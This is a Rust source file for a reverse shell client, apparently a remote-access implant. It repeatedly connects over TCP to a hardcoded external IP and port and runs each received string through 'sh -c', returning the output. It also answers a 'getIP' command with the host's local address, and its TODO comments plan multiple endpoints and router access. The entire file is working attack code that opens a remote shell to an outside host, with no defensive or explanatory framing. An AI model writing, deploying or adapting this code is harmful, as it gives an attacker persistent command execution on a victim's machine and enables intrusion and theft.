use std::net::{TcpStream, Shutdown};
use std::io::Write;
use std::io::Read;
use std::process::Command;
use local_ip_address::local_ip;
use std::{thread, time};

//TODO 
//Implement multiple IP addresses and ports (eventually connect to the router)
//Implement CD
//Implement connect function that always tries to connect then returns a socket
//Refactor

fn main() {
    let IP = "129.21.49.57:5678";
    let mut stream = connect(IP); //connects via TCP
    loop {
        let mut buffer = [0;1024]; //set the buffer
        let num_of_bytes = stream.read(&mut buffer).unwrap(); //read the buffer
        if num_of_bytes == 0{
            // stream.shutdown(Shutdown::Both).expect("shutdown call failed");
            thread::sleep(time::Duration::from_millis(2000));
            stream = connect(IP);
            continue;
        }
        let recv = std::str::from_utf8(&buffer).unwrap().trim_matches(char::from(0)); //string of recv
        // println!("Received: {}",&recv); //print that shit
        if recv.contains("getIP") { //if it's getIP, return the IP
            let local_ip = local_ip().unwrap(); //get the local IP
            // println!("Sent: {}",&localIP); //print it
            let local_ip = format!("{}\n",&local_ip);
            let local_ip = local_ip.as_bytes();
            stream.write(&local_ip).unwrap(); //send it
        } else {
                // println!("Command: {}",&recv);
                let output = Command::new("sh").arg("-c").arg(&recv).output().expect("execution failed from the client"); //run this
                let stderrout = format!("{}{}",String::from_utf8_lossy(&output.stdout),String::from_utf8_lossy(&output.stderr));
                // println!("Output: {}",stderrout);
                stream.write(&stderrout.as_bytes()).unwrap(); //send that shit
        };
    }
    stream.shutdown(Shutdown::Both).expect("shutdown call failed");
}
    
    // fn sendCommand(cmd: &str, stream: &TcpStream){
        //     //if it's windows, run command with cmd /c
        //     //if it's not windows, run sh -c
        //     true;
        // }
        
        fn connect(IP: &str) -> TcpStream {
    loop {
        match TcpStream::connect(IP){
            Ok(con) => {
                return con;
            },
            Err(_) => {
                println!("trying to connect");
                thread::sleep(time::Duration::from_millis(2000));
                continue;
            }
        } 
    }
}